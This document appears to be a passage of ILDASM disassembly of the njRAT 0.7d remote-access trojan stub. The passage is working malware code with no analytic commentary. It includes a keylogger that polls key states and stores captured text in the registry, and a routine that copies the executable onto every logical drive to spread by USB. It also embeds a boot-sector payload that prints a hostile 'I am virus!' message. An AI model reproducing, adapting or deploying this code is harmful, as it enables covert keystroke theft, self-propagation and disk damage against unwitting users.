             native int V_5,
             class [mscorlib]System.Exception V_6,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_7)
    .try
    {
      IL_0000:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor()
      IL_0005:  stloc.1
      IL_0006:  ldc.i4     0xff
      IL_000b:  newarr     [mscorlib]System.Byte
      IL_0010:  stloc.2
      IL_0011:  ldloc.2
      IL_0012:  call       bool j.kl::GetKeyboardState(uint8[])
      IL_0017:  brtrue.s   IL_0021

      IL_0019:  ldstr      ""
      IL_001e:  stloc.0
      IL_001f:  leave.s    IL_0088

      IL_0021:  ldarg.0
      IL_0022:  ldc.i4.0
      IL_0023:  call       uint32 j.kl::MapVirtualKey(uint32,
                                                      uint32)
      IL_0028:  stloc.3
      IL_0029:  ldc.i4.0
      IL_002a:  stloc.s    V_4
      IL_002c:  call       native int j.OK::GetForegroundWindow()
      IL_0031:  ldloca.s   V_4
      IL_0033:  call       int32 j.kl::GetWindowThreadProcessId(native int,
                                                                int32&)
      IL_0038:  call       int32 j.kl::GetKeyboardLayout(int32)
      IL_003d:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
      IL_0042:  stloc.s    V_5
      IL_0044:  ldarg.0
      IL_0045:  ldloc.3
      IL_0046:  ldloc.2
      IL_0047:  ldloc.1
      IL_0048:  ldc.i4.5
      IL_0049:  ldc.i4.0
      IL_004a:  ldloc.s    V_5
      IL_004c:  call       int32 j.kl::ToUnicodeEx(uint32,
                                                   uint32,
                                                   uint8[],
                                                   class [mscorlib]System.Text.StringBuilder,
                                                   int32,
                                                   uint32,
                                                   native int)
      IL_0051:  pop
      IL_0052:  ldloc.1
      IL_0053:  callvirt   instance string [mscorlib]System.Text.StringBuilder::ToString()
      IL_0058:  stloc.0
      IL_0059:  leave.s    IL_0088

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_005b:  dup
      IL_005c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0061:  stloc.s    V_6
      IL_0063:  ldloc.s    V_6
      IL_0065:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_006a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_006f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0074:  leave.s    IL_0076

    }  // end handler
    IL_0076:  ldarg.0
    IL_0077:  conv.ovf.i4.un
    IL_0078:  stloc.s    V_7
    IL_007a:  ldloca.s   V_7
    IL_007c:  constrained. [System.Windows.Forms]System.Windows.Forms.Keys
    IL_0082:  callvirt   instance string [mscorlib]System.Enum::ToString()
    IL_0087:  stloc.0
    IL_0088:  ldloc.0
    IL_0089:  ret
  } // end of method kl::VKCodeToUnicode

  .method public instance void  WRK() cil managed
  {
    // Code size       286 (0x11e)
    .maxstack  5
    .locals init (int32 V_0,
             int32 V_1,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_2,
             string V_3,
             int32 V_4,
             class [mscorlib]System.Exception V_5)
    IL_0000:  ldarg.0
    IL_0001:  ldarg.0
    IL_0002:  ldfld      string j.kl::vn
    IL_0007:  ldstr      ""
    IL_000c:  call       object j.OK::GTV(string,
                                          object)
    IL_0011:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0016:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_001b:  stfld      string j.kl::Logs
    .try
    {
      IL_0020:  ldc.i4.0
      IL_0021:  stloc.0
      IL_0022:  ldloc.0
      IL_0023:  ldc.i4.1
      IL_0024:  add.ovf
      IL_0025:  stloc.0
      IL_0026:  ldc.i4.0
      IL_0027:  stloc.1
      IL_0028:  ldloc.1
      IL_0029:  call       int16 j.kl::GetAsyncKeyState(int32)
      IL_002e:  ldc.i4     0xffff8001
      IL_0033:  ceq
      IL_0035:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_003a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
      IL_003f:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CtrlKeyDown()
      IL_0044:  ldc.i4.0
      IL_0045:  ceq
      IL_0047:  and
      IL_0048:  brfalse.s  IL_008d

      IL_004a:  ldloc.1
      IL_004b:  stloc.2
      IL_004c:  ldarg.0
      IL_004d:  ldloc.2
      IL_004e:  call       instance string j.kl::Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys)
      IL_0053:  stloc.3
      IL_0054:  ldloc.3
      IL_0055:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_005a:  ldc.i4.0
      IL_005b:  ble.s      IL_0086

      IL_005d:  ldarg.0
      IL_005e:  ldarg.0
      IL_005f:  ldfld      string j.kl::Logs
      IL_0064:  ldarg.0
      IL_0065:  call       instance string j.kl::AV()
      IL_006a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_006f:  stfld      string j.kl::Logs
      IL_0074:  ldarg.0
      IL_0075:  ldarg.0
      IL_0076:  ldfld      string j.kl::Logs
      IL_007b:  ldloc.3
      IL_007c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0081:  stfld      string j.kl::Logs
      IL_0086:  ldarg.0
      IL_0087:  ldloc.2
      IL_0088:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys j.kl::lastKey
      IL_008d:  ldloc.1
      IL_008e:  ldc.i4.1
      IL_008f:  add.ovf
      IL_0090:  stloc.1
      IL_0091:  ldloc.1
      IL_0092:  ldc.i4     0xff
      IL_0097:  ble.s      IL_0028

      IL_0099:  ldloc.0
      IL_009a:  ldc.i4     0x3e8
      IL_009f:  bne.un.s   IL_00f7

      IL_00a1:  ldc.i4.0
      IL_00a2:  stloc.0
      IL_00a3:  ldstr      "[klen]"
      IL_00a8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_00ad:  ldc.i4     0x400
      IL_00b2:  mul.ovf
      IL_00b3:  stloc.s    V_4
      IL_00b5:  ldarg.0
      IL_00b6:  ldfld      string j.kl::Logs
      IL_00bb:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00c0:  ldloc.s    V_4
      IL_00c2:  ble.s      IL_00e4

      IL_00c4:  ldarg.0
      IL_00c5:  ldarg.0
      IL_00c6:  ldfld      string j.kl::Logs
      IL_00cb:  ldc.i4.0
      IL_00cc:  ldarg.0
      IL_00cd:  ldfld      string j.kl::Logs
      IL_00d2:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00d7:  ldloc.s    V_4
      IL_00d9:  sub.ovf
      IL_00da:  callvirt   instance string [mscorlib]System.String::Remove(int32,
                                                                           int32)
      IL_00df:  stfld      string j.kl::Logs
      IL_00e4:  ldarg.0
      IL_00e5:  ldfld      string j.kl::vn
      IL_00ea:  ldarg.0
      IL_00eb:  ldfld      string j.kl::Logs
      IL_00f0:  ldc.i4.1
      IL_00f1:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_00f6:  pop
      IL_00f7:  ldc.i4.1
      IL_00f8:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_00fd:  br         IL_0022

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0102:  dup
      IL_0103:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0108:  stloc.s    V_5
      IL_010a:  ldloc.s    V_5
      IL_010c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0111:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0116:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_011b:  leave.s    IL_011d

    }  // end handler
    IL_011d:  ret
  } // end of method kl::WRK

} // end of class j.kl

.class public auto ansi j.A
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method A::.ctor

  .method public static void  main() cil managed
  {
    .entrypoint
    .custom instance void [mscorlib]System.STAThreadAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  call       void j.OK::ko()
    IL_0005:  ret
  } // end of method A::main

} // end of class j.A

.class public auto ansi spredusb
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method spredusb::.ctor

  .method public static void  Start() cil managed
  {
    // Code size       104 (0x68)
    .maxstack  3
    .locals init (string V_0,
             string[] V_1,
             int32 V_2)
    IL_0000:  call       class My.MyComputer My.MyProject::get_Computer()
    IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_000a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::get_SpecialDirectories()
    IL_000f:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy::get_ProgramFiles()
    IL_0014:  stloc.0
    IL_0015:  call       string[] [mscorlib]System.IO.Directory::GetLogicalDrives()
    IL_001a:  stloc.1
    IL_001b:  ldc.i4.0
    IL_001c:  stloc.2
    IL_001d:  br.s       IL_0061

    IL_001f:  ldloc.1
    IL_0020:  ldloc.2
    IL_0021:  ldelem.ref
    IL_0022:  stloc.0
    .try
    {
      IL_0023:  ldloc.0
      IL_0024:  ldsfld     string j.OK::RG
      IL_0029:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_002e:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0033:  brtrue.s   IL_004f

      IL_0035:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetExecutingAssembly()
      IL_003a:  callvirt   instance string [mscorlib]System.Reflection.Assembly::get_Location()
      IL_003f:  ldloc.0
      IL_0040:  ldsfld     string j.OK::RG
      IL_0045:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_004a:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string)
      IL_004f:  leave.s    IL_005d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0051:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0056:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005b:  leave.s    IL_005d

    }  // end handler
    IL_005d:  ldloc.2
    IL_005e:  ldc.i4.1
    IL_005f:  add.ovf
    IL_0060:  stloc.2
    IL_0061:  ldloc.2
    IL_0062:  ldloc.1
    IL_0063:  ldlen
    IL_0064:  conv.i4
    IL_0065:  blt.s      IL_001f

    IL_0067:  ret
  } // end of method spredusb::Start

} // end of class spredusb

.class private auto ansi sealed '<PrivateImplementationDetails>'
       extends [mscorlib]System.Object
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .class explicit ansi sealed nested private '__StaticArrayInitTypeSize=512'
         extends [mscorlib]System.ValueType
  {
    .pack 1
    .size 512
  } // end of class '__StaticArrayInitTypeSize=512'

  .field static assembly initonly valuetype '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=512' F4302D72A369C8BADBF2BE9C2854DF4529637155 at I_0000FAF0
  .method assembly static uint32  ComputeStringHash(string s) cil managed
  {
    // Code size       44 (0x2c)
    .maxstack  2
    .locals init (uint32 V_0,
             int32 V_1)
    IL_0000:  ldc.i4     0x811c9dc5
    IL_0005:  stloc.0
    IL_0006:  ldarg.0
    IL_0007:  brfalse.s  IL_002a

    IL_0009:  ldc.i4.0
    IL_000a:  stloc.1
    IL_000b:  br.s       IL_0021

    IL_000d:  ldarg.0
    IL_000e:  ldloc.1
    IL_000f:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
    IL_0014:  ldloc.0
    IL_0015:  xor
    IL_0016:  ldc.i4     0x1000193
    IL_001b:  mul
    IL_001c:  stloc.0
    IL_001d:  ldloc.1
    IL_001e:  ldc.i4.1
    IL_001f:  add
    IL_0020:  stloc.1
    IL_0021:  ldloc.1
    IL_0022:  ldarg.0
    IL_0023:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0028:  blt.s      IL_000d

    IL_002a:  ldloc.0
    IL_002b:  ret
  } // end of method '<PrivateImplementationDetails>'::ComputeStringHash

} // end of class '<PrivateImplementationDetails>'


// =============================================================

.data cil I_0000FAF0 = bytearray (
                 EB 00 31 C0 8E D8 FC B8 12 00 CD 10 BE 24 7C B3  // ..1..........$|.
                 03 E8 02 00 EB FE B7 00 AC 3C 00 74 06 B4 0E CD  // .........<.t....
                 10 EB F5 C3 49 20 61 6D 20 76 69 72 75 73 21 20  // ....I am virus! 
                 46 75 63 6B 20 59 6F 75 20 3A 2D 29 00 00 00 00  // Fuck You :-)....
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 55 AA) // ..............U.
// *********** DISASSEMBLY COMPLETE ***********************
// WARNING: Created Win32 resource file C:\Users\King\Desktop\CompileShowcase - Copy\SRC-njRAT-0.7d-Platinum-Edition-main\SRC-njRAT-0.7d-Platinum-Edition-main\Stub\bin\Release\App.res
